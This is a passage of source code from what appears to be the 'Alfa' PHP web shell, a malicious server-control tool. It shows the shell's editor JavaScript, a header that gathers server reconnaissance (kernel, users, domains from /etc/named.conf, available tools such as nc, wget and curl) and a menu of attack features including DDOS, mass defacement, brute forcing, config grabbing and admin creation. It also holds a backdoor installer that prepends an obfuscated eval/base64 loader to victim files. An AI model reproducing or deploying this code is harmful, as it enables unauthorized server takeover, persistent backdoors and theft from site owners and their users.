.tab_name.tab_is_active.tab-is-done");null!=a&&a.classList.remove("tab-is-done")}else"database_window"==e&&(database_window_is_minimized=!1);popupWindowBackPosition(),d.body.style.overflow="hidden"}function editorMinimize(e){$(e).setAttribute("class","editor-anim-minimize"),$(e+"-minimized").setAttribute("class","minimized-show"),"editor"==e?is_minimized=!0:"cgiloader"==e?cgi_is_minimized=!0:"options_window"==e?options_window_is_minimized=!0:"database_window"==e&&(database_window_is_minimized=!0),popupWindowBackPosition(),d.body.style.overflow="visible"}function clearEditorHistory(){if(confirm("Are u Sure?"))for(var e in editor_files)e!=editor_current_file&&removeHistory(e)}function isArchive(e){var a,t=[".tar.gz",".tar.bz2",".tar.z",".tar.xz",".zip",".zipx",".7z",".bz2",".gz",".rar",".tar",".tgz"];for(a in t)if(new RegExp("(.*)("+t[a].replace(/\./g,"\\.")+")$","gi").test(e))return!0;return!1}function editor(e,a,t,i,l,o){if("dir"==o&&".."==e)return!1;if("download"==a)return g("FilesTools",i,e,"download"),!1;var r="",n="",s="",c="",f=d.mf.c.value,_=!0;if(e=e.trim(),0==Object.keys(editor_files).length){var u=getCookie("alfa_history_files");try{for(var p in u=atob(u),editor_files=JSON.parse(u))insertToHistory(p,editor_files[p].file,0,editor_files[p].type)}catch(e){}}if("phar://"==e.substr(0,7))f=c_;else if(-1!=e.indexOf("/")){var m=e.split("/");e=m[m.length-1],delete m[m.length-1],f=m.join("/"),islinux&&(f="/"+f)}if(void 0===o&&(o=""),void 0!==i&&null!=i&&0!=i.length&&(f=i.trim()),"auto"==a&&isArchive(e))return alfaSyncMenuToOpt(e,!0),!1;try{for(var v in editor_files)if(editor_files[v].file==decodeURIComponent(e)&&editor_files[v].pwd.replace(/\//g,"")==f.replace(/\//g,"")){_=!1,l=v;break}}catch(e){}if(editor_error=!0,void 0!==t&&0!=t.length&&null!=t&&(r=alfab64(t)),void 0!==l&&null!=l&&0!=l.length)n=alfab64(l),s=l,c=l.replace("file_","");else{var h="file_"+(c=getRandom(10));n=alfab64(h),s=h}var b="editor_source_"+c;if(null==$(b)){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}d.querySelector(".editor-tabs").insertAdjacentHTML("beforeend","<div onclick='editorTabController(this);' opt_id='"+b+"' id='tab_"+b+"' class='editor-tab-name editor-tab-active'>"+decodeURIComponent(e)+" <img opt_id='"+b+"' onclick='closeEditorContent(this,event);return false;' title='[close]' src='http://solevisible.com/icons/menu/delete.svg'></div>"),d.querySelector(".editor-content-holder").insertAdjacentHTML("afterbegin","<div class='editor-contents editor-content-active' id='"+b+"'></div>")}return 0==is_minimized&&"none"==$("editor").style.display?($("editor").style.display="block",showEditor("editor"),alfaloader(b,"block")):(is_minimized&&showEditor("editor"),null!=$(b)?alfaloader(b,"block"):(alfaloader("editor","block"),b="editor")),_Ajax(d.URL,"a="+alfab64("FilesTools")+"&c="+alfab64(f)+"&alfa1="+alfab64(e)+"&alfa2="+alfab64(a)+"&alfa3="+r+"&alfa4="+n+"&alfa5=&alfa6=&alfa7=&alfa8=&alfa9=&alfa10=&&ajax="+alfab64("true"),function(t,i){var l=$("tab_"+i);try{null!=l&&((-1==l.classList.value.indexOf("editor-tab-active")||is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","Editor: "+l.innerText)),is_minimized&&alfaUpdateOptionsBadge("editor"))}catch(t){}if("none"==$("editor").style.display?alfaLoaderOnTop("none"):alfaloader(i,"none"),r.length>0&&"edit"==a)return is_minimized||null!=l&&-1!=l.classList.value.indexOf("editor-tab-active")&&alfaShowNotification("saved...!","Editor"),!1;if(null!=$(i)&&($(i).innerHTML=t),is_minimized&&alfaShowNotification("proccess is done...","Editor: "+decodeURIComponent(e)),$("editor").style.display="block",evalJS(t),alfaLoadAceEditor("view_ml_content"),"delete"!=a&&editor_error){var c=d.getElementsByClassName("is_active");0!=c.length&&(c[0].className="file-holder"),n=s,e=decodeURIComponent(e),!editor_files[n]&&_?(editor_files[n]={file:e,pwd:f,type:o},insertToHistory(n,e," is_active",o),"mkfile"==a&&g("FilesMan",null)):$(n).parentNode.className+=" is_active"}d.body.style.overflow="hidden",d.getElementsByClassName("filestools")[0].setAttribute("fid",n),editor_files[n]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[n].pwd+"/"+editor_files[n].file).replace(/\/\//g,"/")),editor_current_file=n,updateCookieEditor()},!1,b),!1}function alfaLoadAceEditor(e,a){if(void 0===a&&(a=!1),null==$("alfa-ace-plugin")){var t=document.createElement("script");return t.src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.11/ace.js",t.id="alfa-ace-plugin",t.onload=function(){alfaLoadAceEditor(e,a)},d.body.appendChild(t),!1}try{"allow"==$(e).getAttribute("mode")&&(a=!1)}catch(e){}if("view_ml_content"==e){null==alfa_ace_editors.editor&&(alfa_ace_editors.editor={});var i=getCookie("alfa_ace_theme_editor"),l=getCookie("alfa_ace_fontsize_editor");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".editor-ace-controller").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=getRandom(10),o=e.querySelector(".view_ml_content");o.setAttribute("id","view_ml_content-"+t),alfa_ace_editors.editor["view_ml_content-"+t]=ace.edit(o),alfa_ace_editors.editor["view_ml_content-"+t].setReadOnly(a),alfa_ace_editors.editor["view_ml_content-"+t].setShowPrintMargin(!1),alfa_ace_editors.editor["view_ml_content-"+t].setTheme("ace/theme/"+i),alfa_ace_editors.editor["view_ml_content-"+t].session.setMode("ace/mode/php"),alfa_ace_editors.editor["view_ml_content-"+t].session.setUseWrapMode(!0),alfa_ace_editors.editor["view_ml_content-"+t].commands.addCommand({name:"save",bindKey:{win:"Ctrl-S",mac:"Cmd-S"},exec:function(e){d.querySelector("#ace-save-btn-"+t).click()}}),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","view_ml_content-"+t),-1!=e.classList.value.indexOf("ace-save-btn")&&e.setAttribute("id","ace-save-btn-"+t)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.editor["view_ml_content-"+t].setFontSize(parseInt(l))},1e3)})}else{null==alfa_ace_editors.eval&&(alfa_ace_editors.eval={});i=getCookie("alfa_ace_theme_eval"),l=getCookie("alfa_ace_fontsize_eval");void 0===i&&(i="terminal"),0==i.length&&(i="terminal"),d.querySelectorAll(".php-evals").forEach(function(e){if(null!=e.getAttribute("ace"))return!1;e.setAttribute("ace","ok");var t=e.querySelector(".php-evals-ace"),o=getRandom(10);t.setAttribute("id","phpeval-"+o),alfa_ace_editors.eval["phpeval-"+o]=ace.edit(t),alfa_ace_editors.eval["phpeval-"+o].setReadOnly(a),alfa_ace_editors.eval["phpeval-"+o].setShowPrintMargin(!1),alfa_ace_editors.eval["phpeval-"+o].setTheme("ace/theme/"+i),alfa_ace_editors.eval["phpeval-"+o].session.setMode("ace/mode/php"),alfa_ace_editors.eval["phpeval-"+o].session.setUseWrapMode(!0),e.querySelector("select.ace-theme-selector").value=i,e.querySelectorAll(".ace-controler").forEach(function(e){e.setAttribute("ace_id","phpeval-"+o)}),void 0!==l&&setTimeout(function(){alfa_ace_editors.eval["phpeval-"+o].setFontSize(parseInt(l))},1e3)})}}function insertToHistory(e,a,t,i){var l="";t&&0!=t&&(l=t);var o=document.createElement("div");o.innerHTML="<div id='"+e+"' class='history' onClick='reopen(this);'><div class='editor-icon'>"+loadType(a,i,e)+"</div><div class='editor-file-name'>"+a+"</div></div><div class='history-close' onClick='removeHistory(\""+e+"\");'>X</div>",o.className="file-holder"+l,o.addEventListener("mouseover",function(){setEditorTitle(e,"over"),this.childNodes[1].style.opacity="1"}),o.addEventListener("mouseout",function(){setEditorTitle(e,"out"),this.childNodes[1].style.opacity="0"});var r=d.getElementsByClassName("history-list")[0];r.insertBefore(o,r.firstChild)}function loadType(e,a,t){"none"==a&&_Ajax(d.URL,"a="+alfab64("checkfiletype")+"&path="+alfab64(editor_files[t].pwd)+"&arg="+alfab64(editor_files[t].file),function(e){$(t).innerHTML="<div class='editor-icon'>"+loadType(editor_files[t].file,e,t)+"</div><div class='editor-file-name'>"+editor_files[t].file+"</div>",editor_files[t].type=e});if("file"==a){a=(a=e.split("."))[a.length-1].toLowerCase();-1==["json","ppt","pptx","xls","xlsx","msi","config","cgi","pm","c","cpp","cs","java","aspx","asp","db","ttf","eot","woff","woff2","woff","conf","log","apk","cab","bz2","tgz","dmg","izo","jar","7z","iso","rar","bat","sh","alfa","gz","tar","php","php4","php5","phtml","html","xhtml","shtml","htm","zip","png","jpg","jpeg","gif","bmp","ico","txt","js","rb","py","xml","css","sql","htaccess","pl","ini","dll","exe","mp3","mp4","m4a","mov","flv","swf","mkv","avi","wmv","mpg","mpeg","dat","pdf","3gp","doc","docx","docm"].indexOf(a)&&(a="notfound")}else a="folder";return'<img src="http://solevisible.com/icons/{type}" width="30" height="30">'.replace("{type}",a+".png")}function updateFileEditor(e,a){var t="id_"+e,i="id_chmode_"+e,l="id_rename_"+e,o="id_touch_"+e,r="id_edit_"+e,n="id_download_"+e,d="id_delete_"+e,s=$(t).getAttribute("ftype");"folder"==s&&(s="dir"),"file"==s?($(t).innerHTML=a,$(t).setAttribute("href","#action=fileman&path="+c_+"/"+a),$(t).setAttribute("onclick","editor('"+a+"','auto','','','','file')"),$(r).setAttribute("onclick","editor('"+a+"','edit','','','','"+s+"')"),$(n).setAttribute("onclick","g('FilesTools',null,'"+a+"', 'download')")):($(t).innerHTML="<b>| "+a+" |</b>",$(t).setAttribute("onclick","g('FilesMan', '"+c_+"/"+a+"')")),$(i).setAttribute("onclick","editor('"+a+"','chmod','','','','"+s+"')"),$(l).setAttribute("onclick","editor('"+a+"','rename','','','','"+s+"')"),$(o).setAttribute("onclick","editor('"+a+"','touch','','','','"+s+"')"),$(d).setAttribute("onclick","var chk = confirm('Are You Sure For Delete # "+a+" # ?'); chk ? g('FilesMan',null,'delete', '"+a+"') : '';"),$(t).setAttribute("fname",a)}function updateDirsEditor(e,a){var t=d.mf.c.value+"/",i=editor_files[e].pwd+"/"+a+"/",l=editor_files[e].pwd+"/"+editor_files[e].file+"/";for(var o in i=i.replace(/\/\//g,"/"),l=l.replace(/\/\//g,"/"),-1!=(t=t.replace(/\/\//g,"/")).search(i)&&(initDir(t.replace(i,l)),d.mf.c.value=t.replace(i,l)),editor_files){var r=editor_files[o].pwd+"/";-1!=(r=r.replace(/\/\//g,"/")).search(i)&&(editor_files[o].pwd=r.replace(i,l))}updateCookieEditor()}function updateCookieEditor(){setCookie("alfa_history_files",btoa(JSON.stringify(editor_files)),2012)}function setEditorTitle(e,a){if("out"==a&&""!=editor_current_file){var t=d.querySelector(".editor-tab-name.editor-tab-active");e=null!=t?t.getAttribute("opt_id").replace("editor_source_","file_"):editor_current_file}editor_files[e]&&(d.getElementsByClassName("editor-path")[0].innerHTML=(editor_files[e].pwd+"/"+editor_files[e].file).replace(/\/\//g,"/"))}function removeHistory(e){delete editor_files[e],$(e)&&$(e).parentNode.parentNode.removeChild($(e).parentNode);var a=d.getElementsByClassName("filestools")[0];a&&a.getAttribute("fid")==e&&(a.outerHTML=""),editor_current_file==e&&(editor_current_file=""),updateCookieEditor()}function getRandom(e){for(var a="",t="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",i=void 0===e?20:e;i>0;--i)a+=t[Math.floor(Math.random()*t.length)];return a}function reopen(e){var a=e.getAttribute("id"),t=editor_files[a].pwd,i=editor_files[a].file,l="editor_source_"+a.replace("file_","");null==$(l)?editor(i,"auto","",t,a):editorTabController(l,!0)}function copyToClipboard(e){e=e.getAttribute("ace_id");var a=alfa_ace_editors.editor[e].selection.toJSON();alfa_ace_editors.editor[e].selectAll(),alfa_ace_editors.editor[e].focus(),document.execCommand("copy"),alfa_ace_editors.editor[e].selection.fromJSON(a),alfaShowNotification("text copied","Editor")}function encrypt(e,a){if(null==a||a.length<=0)return null;e=alfab64(e,!0),a=alfab64(a,!0);for(var t="",i="",l=0;l<e.length;)for(var o=0;o<a.length&&(t=e.charCodeAt(l)^a.charCodeAt(o),i+=String.fromCharCode(t),!(++l>=e.length));o++);return alfab64(i,!0)}function reloadSetting(e){return alfaloader(alfa_before_do_action_id,"block"),_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(e.protect.value)+"&alfa2="+alfab64(e.lgpage.value)+"&alfa3="+alfab64(e.username.value)+"&alfa4="+alfab64(e.password.value)+"&alfa5="+alfab64(">>")+"&alfa6="+alfab64(e.icon.value)+"&alfa7="+alfab64(e.post_encrypt.value)+"&alfa8="+alfab64("main")+"&alfa9="+alfab64(e.cgi_api.value)+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e,a){loadPopUpOpTions(a,e),evalJS(e),alfaloader(a,"none")},!1,alfa_before_do_action_id),alfa_before_do_action_id="",0==e.e.value&&1==e.protect.value&&setTimeout("location.reload()",1e3),e.s.value!=e.icon.value&&setTimeout("location.reload()",1e3),!1}function reloadColors(e){var a={};void 0===e?d.querySelectorAll(".colors_input").forEach(function(e){var t=e.getAttribute("target").replace(".","");a[t]=e.value}):a=e;var t=$("use_default_color").checked?"1":"0";_Ajax(d.URL,"a="+alfab64("settings")+"&alfa1="+alfab64(JSON.stringify(a))+"&alfa2="+alfab64(">>")+"&alfa3="+alfab64(t)+"&alfa8="+alfab64("color")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),function(e){evalJS(e)},!0)}function alfab64(e,a){return void 0!==a||0==post_encryption_mode?window.btoa(unescape(encodeURIComponent(e))):encrypt(e,"<?php echo __ALFA_SECRET_KEY__; ?>")}function evalCss(e){var a=document.createElement("style");a.styleSheet?a.styleSheet.cssText=e:a.appendChild(document.createTextNode(e)),d.getElementsByTagName("head")[0].appendChild(a)}function colorHandlerKey(e){setTimeout(function(a){colorHandler(e)},200)}function colorHandler(e){var a=e.getAttribute("target"),t=e.getAttribute("multi"),l=a.indexOf(":hover");if(t){var o=JSON.parse(atob(t)),r="";for(i in o.multi_selector)r+=i+"{"+o.multi_selector[i].replace(/{color}/g,e.value)+"}";evalCss(r)}-1==l||t?($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,".header_values"==a&&(a=".header,.header_values"),d.querySelectorAll(a).forEach(function(a){a.style.color=e.value})):($("input_"+a.replace(".","")).value=e.value,$("gui_"+a.replace(".","")).value=e.value,evalCss(a+"{color: "+e.value+";}"))}function importConfig(e){var a=e.target,t=new FileReader;t.onload=function(){var e=t.result;try{reloadColors(JSON.parse(e))}catch(e){alert("Config is invalid...!")}$("importFileBtn").value=""},t.readAsText(a.files[0])}function checkBox(e){var a=alfa_current_fm_id,t=e.checked;d.querySelectorAll("#filesman_holder_"+a+" form[name=files] input[type=checkbox]").forEach(function(e){e.checked=t})}function runcgi(e){if($("cgiframe").style.height="unset",d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Cgi Shell",d.querySelector("#cgiloader .opt-title").innerHTML="Cgi Shell",cgi_is_minimized&&cgi_lang==e&&(showEditor("cgiloader"),0==php_temrinal_using_cgi))return!1;php_temrinal_using_cgi=!1,_Ajax(d.URL,"a="+alfab64("cgishell")+"&alfa1="+alfab64(e)+"&ajax="+alfab64("true"),function(a){d.body.style.overflow="hidden",$("cgiloader").style.display="block",d.querySelector("#cgiframe .terminal-tabs").innerHTML="",d.querySelector("#cgiframe .terminal-contents").innerHTML=a,cgi_lang=e,cgi_is_minimized&&($("cgiloader-minimized").setAttribute("class","minimized-hide"),setTimeout(function(){$("cgiloader").removeAttribute("class"),is_minimized&&($("editor-minimized").style.top="30%")},1e3))})}Element.prototype.appendAfter=function(e){e.parentNode.insertBefore(this,e.nextSibling)};
</script>
<?php echo"<form style='display:none;' id='dlForm' action='' target='_blank' method='post'>
<input type='hidden' name='a' value='dlfile'>
<input type='hidden' name='c' value=''>
<input type='hidden' name='file' value=''>
</form>
<input type='file' style='display:none;' id='importFileBtn' onchange='importConfig(event);'>
<div id='a_loader'><img src='".__showicon('loader')."'></div>";
$cmd_uname = alfaEx("uname -a",false,false);
$uname = function_exists('php_uname') ? substr(@php_uname(), 0, 120) : (strlen($cmd_uname)>0?$cmd_uname:'( php_uname ) Function Disabled !');
if($uname=="( php_uname ) Function Disabled !"){$GLOBALS["need_to_update_header"]="true";}
echo '
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div id="up_bar_holder"></div>
<div class="whole">
<form method="post" name="mf" style="display:none;">
<input type="hidden" name="a">
<input type="hidden" name="c" value="'.$GLOBALS['cwd'].'">';
for($s=1;$s<=10;$s++){
echo '<input type="hidden" name="alfa'.$s.'">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible"><span style="color:#42ff59;">'.__ALFA_CODE_NAME__.'</span><br><small>Version: <span class="hidden_shell_version">'.__ALFA_VERSION__.'</span></small></a></div>
<div class="header"><table width="100%" border="0">
<tr>
<td width="3%"><span class="header_vars">Uname:</span></td>
<td colspan="2"><span class="header_values" id="header_uname">'.$uname.'</span></td>
</tr>
<tr>
<td><span class="header_vars">User:</span></td>
<td><span class="header_values" id="header_userid">'. $uid . ' [ ' . $user . ' ] </span><span class="header_vars"> Group: </span><span class="header_values" id="header_groupid">' . $gid . ' [ ' . $group . ' ]</span> </td>
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="http://solevisible.com/images/alfa-iran.png" /></td>
</tr>
<tr>
<td><span class="header_vars">PHP:</span></td>
<td><b>'.@phpversion(). ' </b><span class="header_vars"> Safe Mode: '.$safe_modes.'</span></td>
</tr>
<tr>
<td><span class="header_vars">ServerIP:</span></td>
<td><b>'.(!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]).'</b><div style="display:inline;display:none;" class="flag-holder"></div> <span class="header_vars">Your IP:</span><b> '.@$_SERVER["REMOTE_ADDR"].'</b><div style="display:inline;display:none;" class="flag-holder"></div></td>
</tr>
<tr>
<td width="3%"><span class="header_vars">DateTime:</span></td>
<td colspan="2"><b>'.date('Y-m-d H:i:s').'</b></td>
</tr>
<tr>
<td><span class="header_vars">Domains:</span></td>
<td width="76%"><span class="header_values" id="header_domains">';
if($GLOBALS['sys']=='unix'){
$d0mains = _alfa_file("/etc/named.conf",false);
if(!$d0mains){echo "Cant Read [ /etc/named.conf ]";$GLOBALS["need_to_update_header"]="true";}else{
$count=0;
foreach($d0mains as $d0main){
if(@strstr($d0main,"zone")){
preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();
if(strlen(trim($domains[1][0])) > 2){
flush();
$count++;}}}
echo "$count Domains";}}
else{echo("Cant Read [ /etc/named.conf ]");}
echo '</span></td>
</tr>
<tr>
<td height="16"><span class="header_vars">HDD:</span></td>
<td><span class="header_vars">Total:</span><b>'.alfaSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . alfaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
$useful_downloader = '<tr><td height="18" colspan="2"><span class="header_vars">useful:</span><span class="header_values" id="header_useful">--------------</span></td></tr><td height="0" colspan="2"><span class="header_vars">Downloader: </span><span class="header_values" id="header_downloader">--------------</span></td></tr>';
if(!@ini_get('safe_mode')){
if(strlen(alfaEx("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzialfa2','nc','locate','suidperl');
$x=0;
foreach($userful as $item)if(alfaWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
if($x==0){echo "<span class='header_values' id='header_useful'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>
<tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span>';
$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
$x=0;
foreach($downloaders as $item2)if(alfaWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
if($x==0){echo "<span class='header_values' id='header_downloader'>--------------</span>";$GLOBALS["need_to_update_header"] = "true";}
echo '</td>
</tr>';
}else{
echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
}
}else{
echo $useful_downloader;$GLOBALS["need_to_update_header"] = "true";
}
}else{
echo '<tr><td height="18" colspan="2"><span class="header_vars">Windows:</span><b>';
echo alfaEx('ver',false,false);
echo '</td>
</tr> <tr>
<td height="0" colspan="2"><span class="header_vars">Downloader: </span><b>-------------</b></td>
</tr></b>';
}
$quotes = (function_exists('get_magic_quotes_gpc')?get_magic_quotes_gpc():'0');if ($quotes == "1" or $quotes == "on"){$magic = '<b><span class="header_on">ON</span>';}else{$magic = '<span class="header_off">OFF</span>';}
echo '<tr>
<td height="16" colspan="2"><span class="header_vars">Disable Functions: </span><b>'.Alfa_GetDisable_Function().'</b></td>
</tr>
<tr>
<td height="16" colspan="2"><span class="header_vars">CURL :</span>'.$curl.' | <span class="header_vars">SSH2 : </span>'.$ssh2.' | <span class="header_vars">Magic Quotes : </span>'.$magic.' | <span class="header_vars"> MySQL :</span>'.$mysql.' | <span class="header_vars">MSSQL :</span>'.$mssql.' | <span class="header_vars"> PostgreSQL :</span>'.$pg.' | <span class="header_vars"> Oracle :</span>'.$or.' '.($GLOBALS['sys']=="unix"?'| <span class="header_vars"> CGI :</span> '.$cgi_shell:"").'</td><td width="15%"><div id="alfa_solevisible"><center><a href="https://t.me/solevisible" target="_blank"><span><font class="solevisible-text" color="#0F0">Sole Sad & Invisible</font></span></a></center></div></td>
</tr>
<tr>
<td height="11" colspan="3"><span class="header_vars">Open_basedir :</span><b>'.$open_b.'</b> | <span class="header_vars">Safe_mode_exec_dir :</span><b>'.$safe_exe.'</b> | <span class="header_vars"> Safe_mode_include_dir :</span></b>'.$safe_include.'</b></td>
</tr>
<tr>
<td height="11"><span class="header_vars">SoftWare: </span></td>
<td colspan="2"><b>'.@getenv('SERVER_SOFTWARE').'</b></td>
</tr>';
if($GLOBALS['sys']=="win"){
echo '<tr>
<td height="12"><span class="header_vars">DRIVE:</span></td>
<td colspan="2"><b>'.$drives.'</b></td>
</tr>';
}
echo '<tr>
<td height="12"><span class="header_vars">PWD:</span></td>
<td colspan="2"><span id="header_cwd">'.$cwd_links.' </span><a href="#action=fileman&path='.$GLOBALS['home_cwd'].'" onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><span class="home_shell">[ Home Shell ]</span> </a></td>
</tr>
</table>
</div>
<div id="meunlist">
<ul>
';
$li = array('proc'=>'Process','phpeval'=>'Eval','sql'=>'SQL Manager','dumper'=>'Database Dumper','coldumper'=>'Column Dumper','hash'=>'En-Decoder','connect'=>'BC',
'zoneh'=>'ZONE-H','dos'=>'DDOS','safe'=>'ByPasser','cgishell'=>'Cgi Shell','ssiShell'=>'SSI SHELL','cpcrack'=>'Hash Tools',
'portscanner'=>'Port Scaner','basedir'=>'Open BaseDir','mail'=>'Fake Mail','ziper'=>'Compressor','deziper'=>'DeCompressor','IndexChanger'=>'Index Changer','pwchanger'=>'Add New Admin','ShellInjectors'=>'Shell Injectors',
'php2xml'=>'PHP2XML','cloudflare'=>'CloudFlare','Whmcs'=>'Whmcs DeCoder','symlink'=>'Symlink','MassDefacer'=>'Mass Defacer','Crackers'=>'BruteForcer','searcher'=>'Searcher','config_grabber'=>'Config Grabber','fakepage'=>'Fake Page','archive_manager'=>'Archive Manager',
'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','selfrm'=>'Remove Shell'
);
foreach($li as $key=>$value){
echo('<li><a id="menu_opt_'.$key.'" href="#action=options&path='.$GLOBALS['cwd'].'&opt='.$key.'" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt='.$key.'\';g(\''.$key.'\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">'.$value.'</a></li>'."\n");
}
echo '</ul><div style="text-align: center;padding: 6px;"><a id="menu_opt_settings" href="#action=options&path='.$GLOBALS['cwd'].'&opt=settings" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=settings\';g(\'settings\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">Alfa Settings</a><a style="display:none;" id="menu_opt_market" href="#action=options&path='.$GLOBALS['cwd'].'&opt=market" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=market\';g(\'market\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;"><span class="alfa_plus">Alfa market</span></a><a id="menu_opt_aboutus" href="#action=options&path='.$GLOBALS['cwd'].'&opt=aboutus" class="menu_options" onclick="alfa_can_add_opt=true;this.href=\'#action=options&path=\'+c_+\'&opt=aboutus\';g(\'aboutus\',null,\'\',\'\',\'\');d.querySelector(\'.opt-title\').innerHTML=this.innerHTML;">About Us</a>'.(!empty($_COOKIE['AlfaUser']) && !empty($_COOKIE['AlfaPass']) ? '<a href="javascript:void(0);" onclick="alfaLogOut();"><font color="red">LogOut</font></a>':'').'</div></div><div id="filesman_tabs"><div onmouseover="alfaFilesmanTabShowTitle(this,event);" onmouseout="alfaFilesmanTabHideTitle(this,event);" fm_counter="1" path="'.$GLOBALS['cwd'].'" fm_id="1" id="filesman_tab_1" class="filesman_tab filesman-tab-active" onclick="filesmanTabController(this);"><img class="folder-tab-icon" src="http://solevisible.com/icons/menu/folder2.svg"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: maroon;" onClick="alfaFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('magic_quotes_runtime', 0);
@set_time_limit(0);
}}
function alfalogout(){
@setcookie("AlfaUser", null, 2012);
@setcookie("AlfaPass", null, 2012);
unset($_COOKIE['AlfaUser'],$_COOKIE['AlfaPass']);
echo("ok");
}
function showAnimation($name){
	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
}
function __showicon($r){
	$s['btn']='http://solevisible.com/images/btn.png';
	$s['alfamini']='http://solevisible.com/images/alfamini.png';
	$s['loader']='http://solevisible.com/images/loader.svg';
	//return 'data:image/png;base64,'.__get_resource($s[$r]);
	return $s[$r];
}
function alfainbackdoor(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Install BackDoor |</div></p><h3><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'file\')">| In File | </a><a href=javascript:void(0) onclick="g(\'inbackdoor\',null,\'db\')">| In DataBase | </a></h3></center>';
$error = '<font color="red">Error In Inject BackDoor...!<br>File Loader is not Writable Or Not Exists...!</font>';
$success= '<font color="green">Success...!';
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('Alfa Team is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='alfa'>Alfa Team Uploader</option><option value='my'>My Private Shell</option></select>";
$cwd = 'Example: /home/alfa/public_html/index.php';
if($_POST['alfa1']=='file'){
echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='alfa'> <input type='submit' value=' '>{$textarea}</form></p></center>");
if($_POST['alfa2']!=''&&$_POST['alfa3']!=''&&$_POST['alfa4']!=''){
$method = $_POST['alfa2'];
$file = $_POST['alfa3'];
$shell = $_POST['alfa4'];
$key = str_replace(array('"','\''),'',trim($_POST['alfa5']));
if($key=='')$key='alfa';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__ALFA_SHELL_CODE'];}
$code = '<?php if(isset($_GET["alfa"])&&$_GET["alfa"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?alfa=".$key.'</font>');}else{__alert($error);}}}
if($_POST['alfa1']=='db'){
echo("<center><p><div class='txtfont_header'>| In DataBase |</div></p>".getConfigHtml('all')."<p><form onsubmit=\"g('inbackdoor',null,'db',this.db_host.value,this.db_username.value,this.db_password.value,this.db_name.value,this.file.value,this.method.value,this.shell.value,this.key.value);return false;\">");
$table = array('td1' =>
